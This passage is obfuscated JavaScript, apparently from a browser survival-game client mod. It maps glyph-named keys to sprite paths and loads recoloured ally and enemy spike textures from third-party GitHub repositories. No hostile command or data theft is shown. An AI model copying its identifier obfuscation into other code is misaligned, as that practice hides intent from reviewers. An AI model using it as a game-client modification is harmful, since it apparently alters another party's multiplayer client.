			"ΔᐃⲆⲆΔⵠⲆ": "img/day-pebblecompo12.png",
			"ⵠⵠᐃᐃΔⵠⵠ": "img/day-pebblecompo13.png",
			"ᐃⲆᐃΔⵠⵠⵠ": "img/day-pebblecompo14.png",
			"ⲆⲆΔᐃⲆⵠⲆ": "img/day-pebblecompo15.png",
			"ⲆᐃᐃΔⵠⲆᐃ": "img/day-pebblecompo16.png",
			"ᐃΔΔⵠⲆ": "img/day-pebblecompo17.png",
			"ⲆΔⵠⲆⵠⲆΔ": "img/day-pebblecompo18.png",
			"ⲆⲆⵠⲆⲆᐃᐃ": "img/day-pebblecompo19.png",
			"ΔⵠΔΔᐃ": "img/day-pebblecompo20.png",
			"ⵠⵠⵠΔΔ": "img/day-pebblecompo21.png",
			"ᐃᐃⵠⵠⵠᐃᐃ": "img/day-pebblecompo22.png",
			"ᐃᐃᐃΔᐃⲆⲆ": "img/day-pebblecompo23.png",
			"ⲆⵠⵠⵠΔᐃᐃ": "img/day-pebblecompo24.png",
			"ⵠΔΔⵠΔ": "img/day-pebblecompo25.png",
			"ᐃᐃⲆΔᐃ": "img/day-pebblecompo26.png",
			"ᐃⲆᐃᐃΔⲆⵠ": "img/day-pebblecompo27.png",
			"ⵠᐃⵠᐃⵠ": "img/day-pebblecompo28.png",
			"ⲆⵠⵠΔᐃΔⵠ": "img/night-pebblecompo1.png",
			"ⵠΔⲆᐃⲆ": "img/night-pebblecompo2.png",
			"ᐃᐃⵠΔΔ": "img/night-pebblecompo3.png",
			"ΔΔΔⲆᐃⵠᐃ": "img/night-pebblecompo4.png",
			"ⵠⵠΔΔⲆ": "img/night-pebblecompo5.png",
			"ⵠᐃΔᐃⵠ": "img/night-pebblecompo6.png",
			"ⲆⵠΔᐃᐃ": "img/night-pebblecompo7.png",
			"ⵠⵠᐃⲆᐃᐃⲆ": "img/night-pebblecompo8.png",
			"ⲆⲆⲆⲆⲆⲆΔ": "img/night-pebblecompo9.png",
			"ⲆⵠⵠⵠⲆⲆⵠ": "img/night-pebblecompo10.png",
			"ΔᐃⲆⲆᐃ": "img/night-pebblecompo11.png",
			"ⲆΔⲆⲆⵠᐃᐃ": "img/night-pebblecompo12.png",
			"ⵠᐃⵠΔⵠⲆᐃ": "img/night-pebblecompo13.png",
			"ᐃⲆⲆΔᐃΔᐃ": "img/night-pebblecompo14.png",
			"ᐃᐃΔᐃⵠΔⲆ": "img/night-pebblecompo15.png",
			"ⵠⲆⲆᐃⵠᐃΔ": "img/night-pebblecompo16.png",
			"ᐃΔⲆⵠΔ": "img/night-pebblecompo17.png",
			"ⲆⲆⵠᐃⲆᐃⵠ": "img/night-pebblecompo18.png",
			"ΔⲆΔΔΔᐃΔ": "img/night-pebblecompo19.png",
			"ⵠⵠᐃΔⵠ": "img/night-pebblecompo20.png",
			"ⵠⲆᐃᐃΔ": "img/night-pebblecompo21.png",
			"ⲆⵠⲆⲆⲆΔⵠ": "img/night-pebblecompo22.png",
			"ΔᐃᐃΔⵠⲆⵠ": "img/night-pebblecompo23.png",
			"ⵠΔΔⲆⵠⵠⲆ": "img/night-pebblecompo24.png",
			"ᐃⲆᐃⲆΔ": "img/night-pebblecompo25.png",
			"ΔᐃⵠᐃΔ": "img/night-pebblecompo26.png",
			"ⵠⲆᐃᐃᐃⲆⲆ": "img/night-pebblecompo27.png",
			"ΔⲆᐃⵠΔ": "img/night-pebblecompo28.png",
			"ⲆⵠⲆⵠⲆᐃΔ": "img/day-baby-mammoth.png",
			"ᐃΔⲆⲆⲆⵠᐃ": "img/day-baby-mammoth-tamed.png",
			"ⵠΔⲆⵠⵠΔΔ": "img/day-baby-mammoth-angry.png",
			"ⲆᐃᐃΔⲆᐃⵠ": "img/night-baby-mammoth.png",
			"ⵠⵠΔⵠⵠⲆⵠ": "img/night-baby-mammoth-tamed.png",
			"ΔΔⵠΔⵠᐃⵠ": "img/night-baby-mammoth-angry.png",
			"ⲆⵠΔⲆΔⲆΔ": "img/inv-mammoth-out.png",
			"ᐃⲆⲆᐃⵠⲆΔ": "img/inv-mammoth-in.png",
			"ᐃⵠΔⵠΔⵠΔ": "img/inv-mammoth-click.png",
			"ᐃΔΔΔΔⵠⵠ": "img/hurt-baby-mammoth.png",
			"ΔΔⵠΔⵠⲆᐃ": "img/baby-mammoth-step.png",
			"ΔⵠⲆⵠΔΔΔ": "img/day-flower-hat.png",
			"ⵠᐃⲆⲆᐃΔΔ": "img/night-flower-hat.png",
			"ⲆΔΔᐃⲆᐃⲆ": "img/inv-flower-hat-out.png",
			"ᐃᐃⵠⵠᐃᐃΔ": "img/inv-flower-hat-in.png",
			"ⵠΔΔΔΔᐃⲆⵠⲆ": "img/inv-flower-hat-click.png",
			"ⵠΔᐃΔⲆᐃⵠΔⵠ": "img/day-fur-hat.png",
			"ⵠΔⲆⵠⵠΔⵠΔⵠ": "img/night-fur-hat.png",
			"ⵠΔᐃⲆⲆΔⲆΔᐃ": "img/inv-fur-hat-out.png",
			"ᐃⵠⲆⵠⵠΔΔⵠⲆ": "img/inv-fur-hat-in.png",
			"ⲆᐃᐃΔᐃᐃᐃⵠⵠ": "img/inv-fur-hat-click.png",
			"ᐃⲆⲆΔⵠⲆᐃⵠⲆ": "img/day-mammoth.png",
			"ⵠⲆⵠΔᐃⲆⵠΔⵠ": "img/night-mammoth.png",
			"ⲆΔᐃⲆⵠᐃᐃ": "img/hurt-mammoth.png",
			"ⲆⵠᐃⲆⵠᐃⵠⲆⵠ": "img/inv-mammoth-fur-out.png",
			"ΔⲆⲆᐃᐃⵠᐃΔΔ": "img/inv-mammoth-fur-in.png",
			"ⲆᐃᐃⲆⵠΔⲆΔⲆ": "img/inv-mammoth-fur-click.png",
			"ⲆΔᐃⲆᐃᐃⲆΔᐃ": "img/inv-wood-bow-out.png",
			"ⵠΔⲆⲆᐃⲆᐃⲆⵠ": "img/inv-wood-bow-in.png",
			"ΔᐃⲆⵠᐃⵠᐃΔᐃ": "img/inv-wood-bow-click.png",
			"ⲆΔⲆⲆⲆΔⵠⵠΔ": "img/inv-wood-arrow-out.png",
			"ⲆⵠⵠᐃΔⵠΔΔⲆ": "img/inv-wood-arrow-in.png",
			"ⲆᐃⵠⲆΔᐃᐃⵠΔ": "img/inv-wood-arrow-click.png",
			"ΔⵠⲆᐃᐃⵠᐃⲆⵠ": "img/day-wood-bow2.png",
			"ⵠⵠⵠⲆⲆΔΔᐃⵠ": "img/night-wood-bow2.png",
			"ⲆⲆⵠΔⲆΔΔ": "img/day-wood-arrow.png",
			"ⵠᐃᐃΔΔΔᐃ": "img/night-wood-arrow.png",
			"ᐃⵠΔⲆⲆⲆⲆⲆⵠ": "img/inv-stone-bow-out.png",
			"ⲆⵠᐃⲆⲆᐃΔᐃⵠ": "img/inv-stone-bow-in.png",
			"ⲆΔⲆⵠⲆⵠᐃⲆⵠ": "img/inv-stone-bow-click.png",
			"ΔΔⲆᐃᐃⵠⵠⵠⵠ": "img/inv-stone-arrow-out.png",
			"ᐃΔⲆᐃⵠⵠᐃⵠΔ": "img/inv-stone-arrow-in.png",
			"ⲆΔⲆᐃΔᐃⲆᐃⵠ": "img/inv-stone-arrow-click.png",
			"ⵠⵠΔΔⲆΔⵠΔⲆ": "img/day-stone-bow.png",
			"ΔᐃⲆΔⲆⲆᐃᐃᐃ": "img/night-stone-bow.png",
			"ᐃⲆⲆᐃᐃⵠⲆ": "img/day-stone-arrow.png",
			"ⵠⲆΔⵠΔⲆΔ": "img/night-stone-arrow.png",
			"ⲆⲆⲆΔᐃᐃΔᐃᐃ": "img/inv-gold-bow-out.png",
			"ᐃᐃΔⲆΔΔΔⵠΔ": "img/inv-gold-bow-in.png",
			"ⲆΔⵠΔⵠᐃⵠⲆⲆ": "img/inv-gold-bow-click.png",
			"ΔᐃⲆⵠᐃⵠᐃΔΔ": "img/inv-gold-arrow-out.png",
			"ΔΔΔⲆⵠⵠΔᐃⲆ": "img/inv-gold-arrow-in.png",
			"ⲆⲆΔΔⲆᐃⲆⵠⵠ": "img/inv-gold-arrow-click.png",
			"ΔⲆᐃᐃⲆΔⵠⲆᐃ": "img/day-gold-bow.png",
			"ΔⵠΔⲆⲆⲆⵠⵠΔ": "img/night-gold-bow.png",
			"ᐃᐃⵠΔΔⵠΔ": "img/day-gold-arrow.png",
			"ⲆΔᐃⵠⲆⵠᐃ": "img/night-gold-arrow.png",
			"ΔΔΔΔⵠΔᐃᐃᐃ": "img/inv-diamond-bow-out.png",
			"ΔⵠᐃⲆΔΔᐃⲆᐃ": "img/inv-diamond-bow-in.png",
			"ΔᐃⲆⲆᐃⵠⲆⲆᐃ": "img/inv-diamond-bow-click.png",
			"ⵠΔᐃⵠᐃΔⵠᐃᐃ": "img/inv-diamond-arrow-out.png",
			"ᐃΔⲆΔΔᐃⲆⲆⲆ": "img/inv-diamond-arrow-in.png",
			"ΔᐃᐃⵠᐃⲆᐃΔΔ": "img/inv-diamond-arrow-click.png",
			"ᐃᐃᐃΔⲆᐃᐃⵠⵠ": "img/day-diamond-bow.png",
			"ⵠᐃⲆⲆⲆΔΔⲆᐃ": "img/night-diamond-bow.png",
			"ΔⲆᐃᐃᐃΔⲆ": "img/day-diamond-arrow.png",
			"ᐃᐃᐃΔΔⵠⲆ": "img/night-diamond-arrow.png",
			"ᐃⲆⵠΔΔᐃΔⲆᐃ": "img/inv-amethyst-bow-out.png",
			"ⵠⲆΔⵠᐃᐃᐃⲆΔ": "img/inv-amethyst-bow-in.png",
			"ⲆΔᐃⵠᐃΔⵠΔⵠ": "img/inv-amethyst-bow-click.png",
			"ⲆⵠⲆΔⵠΔᐃΔΔ": "img/inv-amethyst-arrow-out.png",
			"ⲆⲆΔⲆΔΔᐃΔᐃ": "img/inv-amethyst-arrow-in.png",
			"ⲆᐃΔⲆⲆΔΔⵠⲆ": "img/inv-amethyst-arrow-click.png",
			"ⲆᐃᐃᐃᐃⲆΔⵠⲆ": "img/day-amethyst-bow.png",
			"ΔΔΔΔⲆΔΔΔⵠ": "img/night-amethyst-bow.png",
			"ΔⵠᐃΔⵠⲆⲆ": "img/day-amethyst-arrow.png",
			"ⵠΔΔⵠᐃⵠΔ": "img/night-amethyst-arrow.png",
			"ᐃᐃᐃⵠΔⵠΔⲆᐃ": "img/inv-dragon-bow-out.png",
			"ⵠᐃᐃⲆΔᐃⲆᐃᐃ": "img/inv-dragon-bow-in.png",
			"ⵠᐃⲆᐃⵠⵠⲆⲆᐃ": "img/inv-dragon-bow-click.png",
			"ΔΔⲆᐃⵠΔⲆᐃⵠ": "img/inv-dragon-arrow-out.png",
			"ᐃΔΔⵠⲆⲆⲆⵠΔ": "img/inv-dragon-arrow-in.png",
			"ⲆⵠⵠΔΔⵠⵠⵠᐃ": "img/inv-dragon-arrow-click.png",
			"ᐃᐃᐃΔᐃΔⲆᐃᐃ": "img/day-dragon-bow.png",
			"ΔᐃⲆΔⵠᐃⲆⵠᐃ": "img/night-dragon-bow.png",
			"ΔⵠΔᐃΔⲆⵠ": "img/day-dragon-arrow.png",
			"ΔΔΔⵠᐃᐃΔ": "img/night-dragon-arrow.png",
			"ⵠⲆΔᐃⲆⲆᐃΔⲆ": "img/inv-reidite-bow-out.png",
			"ᐃⲆⵠⲆⵠⲆᐃⵠΔ": "img/inv-reidite-bow-in.png",
			"ⲆⲆⲆⵠⵠⵠΔⲆΔ": "img/inv-reidite-bow-click.png",
			"ⵠΔΔᐃᐃⲆΔⵠⵠ": "img/inv-reidite-arrow-out.png",
			"ⵠΔⵠᐃΔⵠᐃⵠⲆ": "img/inv-reidite-arrow-in.png",
			"ⲆⲆⵠΔΔⲆⲆᐃΔ": "img/inv-reidite-arrow-click.png",
			"ⲆᐃⵠΔⲆΔⲆⲆᐃ": "img/day-reidite-bow.png",
			"ⵠΔᐃᐃⵠⵠΔᐃⲆ": "img/night-reidite-bow.png",
			"ⵠΔⲆΔⲆⵠΔ": "img/day-reidite-arrow.png",
			"ᐃᐃⵠΔΔᐃⲆᐃᐃ": "img/night-reidite-arrow.png",
			"ᐃᐃⲆⵠⲆᐃΔᐃⵠ": "img/inv-wooden-axe-out.png",
			"ᐃΔⲆⲆΔⵠᐃⵠᐃ": "img/inv-wooden-axe-in.png",
			"ᐃΔᐃᐃⵠⲆⵠᐃⵠ": "img/inv-wooden-axe-click.png",
			"ⲆᐃⲆᐃⵠⲆᐃⲆⵠ": "img/day-wooden-axe.png",
			"ᐃΔΔⲆᐃⵠΔⲆⵠ": "img/night-wooden-axe.png",
			"ΔΔⵠᐃᐃⲆᐃⵠᐃ": "img/inv-stone-axe-out.png",
			"ΔᐃⵠᐃⵠⵠΔᐃᐃ": "img/inv-stone-axe-in.png",
			"ⵠΔⲆⵠΔⵠᐃΔᐃ": "img/inv-stone-axe-click.png",
			"ⵠΔᐃΔΔᐃⲆᐃᐃ": "img/day-stone-axe.png",
			"ᐃΔᐃⲆⵠⵠⵠᐃΔ": "img/night-stone-axe.png",
			"ⲆᐃⵠΔⲆⲆⵠⵠᐃ": "img/inv-golden-axe-out.png",
			"ᐃΔᐃᐃⲆΔΔᐃⲆ": "img/inv-golden-axe-in.png",
			"ⲆᐃⵠⵠΔᐃⲆΔⵠ": "img/inv-golden-axe-click.png",
			"ⵠΔⵠⵠΔⵠⲆᐃΔ": "img/day-golden-axe.png",
			"ⲆΔⵠᐃᐃⵠᐃⵠᐃ": "img/night-golden-axe.png",
			"ⵠⲆΔΔⵠⲆⲆᐃⲆ": "img/inv-diamond-axe-out.png",
			"ⲆΔΔⵠⵠᐃⲆᐃⵠ": "img/inv-diamond-axe-in.png",
			"ⵠᐃᐃⵠᐃⵠᐃΔᐃ": "img/inv-diamond-axe-click.png",
			"ᐃᐃⲆⵠⵠᐃⲆΔΔ": "img/day-diamond-axe.png",
			"ⲆΔⲆⲆⲆⵠΔΔᐃ": "img/night-diamond-axe.png",
			"ᐃⵠΔΔⲆΔᐃⲆⵠ": "img/inv-amethyst-axe-out.png",
			"ΔᐃⲆⲆΔⵠⵠⵠᐃ": "img/inv-amethyst-axe-in.png",
			"ⵠⲆⵠⵠⲆΔⵠⵠⵠ": "img/inv-amethyst-axe-click.png",
			"ⵠΔⲆᐃᐃΔΔⵠᐃ": "img/day-amethyst-axe.png",
			"ᐃᐃⵠΔΔΔΔᐃⵠ": "img/night-amethyst-axe.png",
			"ⵠⲆⲆΔⵠᐃⲆⲆⲆ": "img/inv-reidite-axe-out.png",
			"ΔΔΔⵠΔⵠⲆΔⵠ": "img/inv-reidite-axe-in.png",
			"ᐃⵠᐃΔᐃᐃᐃΔⲆ": "img/inv-reidite-axe-click.png",
			"ΔⲆⲆⵠᐃᐃᐃⲆⲆ": "img/day-reidite-axe.png",
			"ΔᐃⲆΔⵠⵠⲆΔΔ": "img/night-reidite-axe.png",
			"ΔᐃⲆΔⵠⵠΔ": "img/bandage-activated.png",
			"ΔⵠⵠᐃⲆᐃⲆ": "img/auto-feed.png",
			"ⵠᐃΔⲆⵠⲆⲆ": "img/stop-regeneration.png",
			"ⵠᐃᐃΔΔᐃⵠ": "img/stop-regeneration2.png",
			"ᐃΔᐃⵠⵠᐃⵠⲆⲆ": "img/day-wood-platform.png",
			"ΔⵠⲆᐃⵠΔⵠⲆⵠ": "img/night-wood-platform.png",
			"ΔΔⵠⲆⲆΔᐃΔᐃ": "img/inv-wood-platform-in.png",
			"ΔΔᐃⲆΔΔⵠΔᐃ": "img/inv-wood-platform-out.png",
			"ⵠᐃᐃⵠΔⲆΔΔⲆ": "img/inv-wood-platform-click.png",
			"ⵠⲆᐃⵠⵠⵠΔΔΔ": "img/day-wood-shield.png",
			"ᐃᐃΔΔⵠΔⵠⵠᐃ": "img/night-wood-shield.png",
			"ⲆⵠᐃⵠᐃΔᐃⲆⵠ": "img/day-stone-shield.png",
			"ⲆᐃⲆⵠΔⲆᐃⵠⲆ": "img/night-stone-shield.png",
			"ΔΔⵠⵠᐃΔⵠΔⲆ": "img/day-gold-shield.png",
			"ⵠΔᐃᐃⵠΔⵠΔⲆ": "img/night-gold-shield.png",
			"ⲆⵠΔⲆᐃᐃᐃᐃⵠ": "img/day-diamond-shield.png",
			"ⲆⵠᐃⵠΔⲆⵠᐃⲆ": "img/night-diamond-shield.png",
			"ΔᐃᐃᐃⲆΔⲆΔᐃ": "img/day-amethyst-shield.png",
			"ΔⲆΔⲆⵠᐃΔΔΔ": "img/night-amethyst-shield.png",
			"ⲆⲆⲆⵠΔΔΔⵠⵠ": "img/day-reidite-shield.png",
			"ⵠⵠᐃΔⵠᐃⲆⲆᐃ": "img/night-reidite-shield.png",
			"ΔⵠΔⲆⲆᐃΔⵠⵠ": "img/inv-wood-shield-in.png",
			"ⵠⵠΔⲆⲆⵠⵠⲆⲆ": "img/inv-wood-shield-out.png",
			"ⵠᐃⲆΔΔⵠⲆⵠⵠ": "img/inv-wood-shield-click.png",
			"ⲆⲆΔᐃΔᐃⵠᐃⲆ": "img/inv-stone-shield-in.png",
			"ᐃᐃⵠᐃⲆⵠᐃⵠⲆ": "img/inv-stone-shield-out.png",
			"ⵠᐃΔΔⵠΔⲆⲆⵠ": "img/inv-stone-shield-click.png",
			"ⲆⲆⵠⵠⲆΔⵠᐃᐃ": "img/inv-gold-shield-in.png",
			"ⲆⲆᐃᐃⲆᐃΔΔⲆ": "img/inv-gold-shield-out.png",
			"ᐃⵠⲆᐃⵠΔᐃᐃᐃ": "img/inv-gold-shield-click.png",
			"ΔⲆⵠΔᐃⲆΔᐃⵠ": "img/inv-diamond-shield-in.png",
			"ΔⵠⵠᐃΔᐃΔⵠⵠ": "img/inv-diamond-shield-out.png",
			"ΔᐃⲆΔΔⵠⵠⲆΔ": "img/inv-diamond-shield-click.png",
			"ΔⲆⲆⲆᐃⲆΔⲆΔ": "img/inv-amethyst-shield-in.png",
			"ΔⲆᐃⵠᐃᐃⵠⵠⵠ": "img/inv-amethyst-shield-out.png",
			"ΔⲆᐃⵠⵠΔⲆⲆⵠ": "img/inv-amethyst-shield-click.png",
			"ⲆΔᐃⵠΔⲆΔⲆⲆ": "img/inv-reidite-shield-in.png",
			"ᐃⲆⵠⵠⵠⵠⵠᐃⲆ": "img/inv-reidite-shield-out.png",
			"ᐃΔⵠⵠΔⵠⵠⵠΔ": "img/inv-reidite-shield-click.png",
			"ΔⲆᐃᐃⲆⲆⲆⲆⲆ": "img/day-machete.png",
			"ⲆᐃⲆⵠᐃⵠⲆᐃᐃ": "img/night-machete.png",
			"ⵠⲆⵠΔⵠΔΔᐃᐃ": "img/inv-machete-in.png",
			"ᐃᐃᐃⵠⵠⲆⵠⲆᐃ": "img/inv-machete-out.png",
			"ⵠⵠⲆⲆⵠⲆᐃⵠⲆ": "img/inv-machete-click.png"
		};
		ᐃⵠⲆΔⲆⵠⲆ = [{}];
		const Ⲇᐃⵠⵠ = ⵠⲆᐃⵠ;
		ᐃⵠⲆΔⲆⵠⲆ[0].stringify = function(ᐃⲆⵠⵠⵠΔΔ) {
			var ⵠⵠΔⵠⵠⵠⵠ = new Uint8Array(new ArrayBuffer(ᐃⲆⵠⵠⵠΔΔ.length));
			for (var ⵠᐃ = ᐃⵠⲆ; ᐃⲆⵠⵠⵠΔΔ.length > ⵠᐃ; ⵠᐃ++) ⵠⵠΔⵠⵠⵠⵠ[ⵠᐃ] = ᐃⲆⵠⵠⵠΔΔ[ⵠᐃ];
			return ⵠⵠΔⵠⵠⵠⵠ
		};
		const ⵠⵠᐃΔⵠᐃᐃ = ᐃᐃΔᐃⲆ;
		ᐃΔⵠΔᐃΔⵠ = {};
		const ⵠᐃᐃΔΔ = ⲆΔᐃΔⵠ;
		const ΔⵠᐃᐃⵠⲆⲆ = ⵠΔⲆᐃᐃ;
		ᐃΔΔΔᐃⲆⲆΔⲆ = {};
		const ⵠⲆΔᐃⵠⲆⵠᐃⵠ = ᐃⵠᐃᐃᐃⲆΔ;
		for (var ⵠᐃ in ⲆΔ) ᐃΔⵠΔᐃΔⵠ[ⵠᐃ] = ⲆΔ[ⵠᐃ];
		ⵠⲆ = [];
		const sprite = ⵠⲆ;
		sprite[1e4] = [new Image];
		sprite[10001] = [new Image];
		sprite[10002] = [new Image];
		sprite[10003] = [new Image];
		sprite[10004] = [new Image];
		sprite[10005] = [new Image];
		sprite[10006] = [new Image];
		sprite[10007] = [new Image];
		sprite[10008] = [new Image];
		sprite[10009] = [new Image];
		sprite[10010] = [new Image];
		sprite[10011] = [new Image];
		sprite[10012] = [new Image];
		sprite[10013] = [new Image];
		sprite[10014] = [new Image];
		sprite[10015] = [new Image];
		sprite[10016] = [new Image];
		sprite[10017] = [new Image];
		sprite[10018] = [new Image];
		sprite[10019] = [new Image];
		sprite[10020] = [new Image];
		sprite[10021] = [new Image];
		sprite[10022] = [new Image];
		sprite[10023] = [new Image];
		sprite[10024] = [new Image];
		sprite[10025] = [new Image];
		sprite[10026] = [new Image];
		sprite[10027] = [new Image];
		sprite[10028] = [new Image];
		sprite[10029] = [new Image];
		sprite[10030] = [new Image];
		sprite[10031] = [new Image];
		sprite[10032] = [new Image];
		sprite[10033] = [new Image];
		sprite[10034] = [new Image];
		sprite[10035] = [new Image];
		const switchColoredSpikesTextures = () => {
			switch (Settings.ColoredSpikes.textures) {
				case "1": {
					sprite[1e4][0].src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-reidite-spike-ally.png";
					sprite[10001][0].src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-reidite-spike-enemy.png";
					sprite[10002][0].src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-amethyst-spike-ally.png";
					sprite[10003][0].src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-amethyst-spike-enemy.png";
					sprite[10004][0].src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-diamond-spike-ally.png";
					sprite[10005][0].src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-diamond-spike-enemy.png";
					sprite[10006][0].src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-gold-spike-ally.png";
					sprite[10007][0].src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-gold-spike-enemy.png";
					sprite[10008][0].src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-stone-spike-ally.png";
					sprite[10009][0].src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-stone-spike-enemy.png";
					sprite[10010][0].src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-wood-spike-ally.png";
					sprite[10011][0].src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-wood-spike-enemy.png";
					sprite[10012][0].src = "https://raw.githubusercontent.com/XmreLoux/weirdo/main/door_wood2.png";
					sprite[10013][0].src = "https://raw.githubusercontent.com/XmreLoux/weirdo/main/door_wood1.png";
					sprite[10014][0].src = "https://raw.githubusercontent.com/XmreLoux/weirdo/main/door_stone1.png";
					sprite[10015][0].src = "https://raw.githubusercontent.com/XmreLoux/weirdo/main/door_stone2.png";
					sprite[10016][0].src = "https://raw.githubusercontent.com/XmreLoux/weirdo/main/door_gold2.png";
					sprite[10017][0].src = "https://raw.githubusercontent.com/XmreLoux/weirdo/main/door_gold1.png";
					sprite[10018][0].src = "https://raw.githubusercontent.com/XmreLoux/weirdo/main/door_diamond2.png";
					sprite[10019][0].src = "https://raw.githubusercontent.com/XmreLoux/weirdo/main/door_diamond1.png";
					sprite[10020][0].src = "https://raw.githubusercontent.com/XmreLoux/weirdo/main/door_amethyst1.png";
					sprite[10021][0].src = "https://raw.githubusercontent.com/XmreLoux/weirdo/main/door_amethyst2.png";
					sprite[10022][0].src = "https://raw.githubusercontent.com/XmreLoux/weirdo/main/door_reidite2.png";
					sprite[10023][0].src = "https://raw.githubusercontent.com/XmreLoux/weirdo/main/door_reidite1.png";
					sprite[10024][0].src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-wood-spike-door-ally.png";
					sprite[10025][0].src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-wood-spike-door-enemy.png";
					sprite[10026][0].src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-stone-spike-door-ally.png";
					sprite[10027][0].src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-stone-spike-door-enemy.png";
					sprite[10028][0].src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-gold-spike-door-ally.png";
					sprite[10029][0].src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-gold-spike-door-enemy.png";
					sprite[10030][0].src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-diamond-spike-door-ally.png";
					sprite[10031][0].src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-diamond-spike-door-enemy.png";
					sprite[10032][0].src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-amethyst-spike-door-ally.png";
					sprite[10033][0].src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-amethyst-spike-door-enemy.png";
					sprite[10034][0].src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-reidite-spike-door-ally.png";
					sprite[10035][0].src = "https://raw.githubusercontent.com/XmreLoux/For_require/main/images/day-reidite-spike-door-enemy.png"
				};
				break;
			case "2": {
				sprite[1e4][0].src = "https://github.com/XmreLoux/blackspikes/blob/main/day-reidite-spike-enemy.png.111.png?raw=true";
				sprite[10001][0].src = "https://github.com/XmreLoux/blackspikes/blob/main/day-reidite-spike-enemy.png12312.png?raw=true";
				sprite[10002][0].src = "https://github.com/XmreLoux/blackspikes/blob/main/day-amethyst-spike-ally.png312312.png?raw=true";
				sprite[10003][0].src = "https://github.com/XmreLoux/blackspikes/blob/main/day-amethyst-spike-enemy.1213png1.png?raw=true";
				sprite[10004][0].src = "https://github.com/XmreLoux/blackspikes/blob/main/day-diamond-spike-ally.png?raw=true";
				sprite[10005][0].src = "https://github.com/XmreLoux/blackspikes/blob/main/day-diamond-spike-enemy.png1.png1.png?raw=true";
				sprite[10006][0].src = "https://github.com/XmreLoux/blackspikes/blob/main/day-gold-spike-ally%20remaster%20by%20hersgori.png?raw=true";
				sprite[10007][0].src = "https://github.com/XmreLoux/blackspikes/blob/main/day-gold-spike-enemy.png1132.png1.png?raw=true";
				sprite[10008][0].src = "https://github.com/XmreLoux/blackspikes/blob/main/day-stone-spike-ally1.png?raw=true";
				sprite[10009][0].src = "https://github.com/XmreLoux/blackspikes/blob/main/day-stone-spike-enemy.png1.png?raw=true";
				sprite[10010][0].src = "https://github.com/XmreLoux/blackspikes/blob/main/day-wood-spike-all1232y.png?raw=true";
				sprite[10011][0].src = "https://github.com/XmreLoux/blackspikes/blob/main/day-wood-spike-enemy.png123.png1.png?raw=true";
				sprite[10012][0].src = "https://raw.githubusercontent.com/XmreLoux/weirdo/main/door_wood2.png";
				sprite[10013][0].src = "https://raw.githubusercontent.com/XmreLoux/weirdo/main/door_wood1.png";
				sprite[10014][0].src = "https://raw.githubusercontent.com/XmreLoux/weirdo/main/door_stone1.png";
				sprite[10015][0].src = "https://raw.githubusercontent.com/XmreLoux/weirdo/main/door_stone2.png";
				sprite[10016][0].src = "https://raw.githubusercontent.com/XmreLoux/weirdo/main/door_gold2.png";
				sprite[10017][0].src = "https://raw.githubusercontent.com/XmreLoux/weirdo/main/door_gold1.png";
				sprite[10018][0].src = "https://raw.githubusercontent.com/XmreLoux/weirdo/main/door_diamond2.png";
				sprite[10019][0].src = "https://raw.githubusercontent.com/XmreLoux/weirdo/main/door_diamond1.png";
				sprite[10020][0].src = "https://raw.githubusercontent.com/XmreLoux/weirdo/main/door_amethyst1.png";
				sprite[10021][0].src = "https://raw.githubusercontent.com/XmreLoux/weirdo/main/door_amethyst2.png";
				sprite[10022][0].src = "https://raw.githubusercontent.com/XmreLoux/weirdo/main/door_reidite2.png";
				sprite[10023][0].src = "https://raw.githubusercontent.com/XmreLoux/weirdo/main/door_reidite1.png";
				sprite[10024][0].src = "https://github.com/XmreLoux/blackspikes/blob/main/day-wood-spike-door-ally.png?raw=true";
				sprite[10025][0].src = "https://github.com/XmreLoux/blackspikes/blob/main/day-wood-spike-door-enemy.png?raw=true";
				sprite[10026][0].src = "https://github.com/XmreLoux/blackspikes/blob/main/day-stone-spike-door-ally.png?raw=true";
				sprite[10027][0].src = "https://github.com/XmreLoux/blackspikes/blob/main/day-stone-spike-door-enemy.png?raw=true";
				sprite[10028][0].src = "https://github.com/XmreLoux/blackspikes/blob/main/day-gold-spike-door-ally.png?raw=true";
				sprite[10029][0].src = "https://github.com/XmreLoux/blackspikes/blob/main/day-gold-spike-door-enemy.png?raw=true";
				sprite[10030][0].src = "https://github.com/XmreLoux/blackspikes/blob/main/day-diamond-spike-door-ally.png?raw=true";
				sprite[10031][0].src = "https://github.com/XmreLoux/blackspikes/blob/main/day-diamond-spike-door-enemy.png?raw=true";
				sprite[10032][0].src = "https://github.com/XmreLoux/blackspikes/blob/main/day-amethyst-spike-door-ally.png?raw=true";
				sprite[10033][0].src = "https://github.com/XmreLoux/blackspikes/blob/main/day-amethyst-spike-door-enemy.png?raw=true";
				sprite[10034][0].src = "https://github.com/XmreLoux/blackspikes/blob/main/day-reidite-spike-door-ally%20remastered%20by%20hersgori.png?raw=true";
				sprite[10035][0].src = "https://github.com/XmreLoux/blackspikes/blob/main/day-reidite-spike-door-enemy.png?raw=true"
			};
			break
			}
		};
		switchColoredSpikesTextures();
		sprite[1e4][1] = sprite[1e4][0];
		sprite[10001][1] = sprite[10001][0];
		sprite[10002][1] = sprite[10002][0];
		sprite[10003][1] = sprite[10003][0];
		sprite[10004][1] = sprite[10004][0];
		sprite[10005][1] = sprite[10005][0];
		sprite[10006][1] = sprite[10006][0];
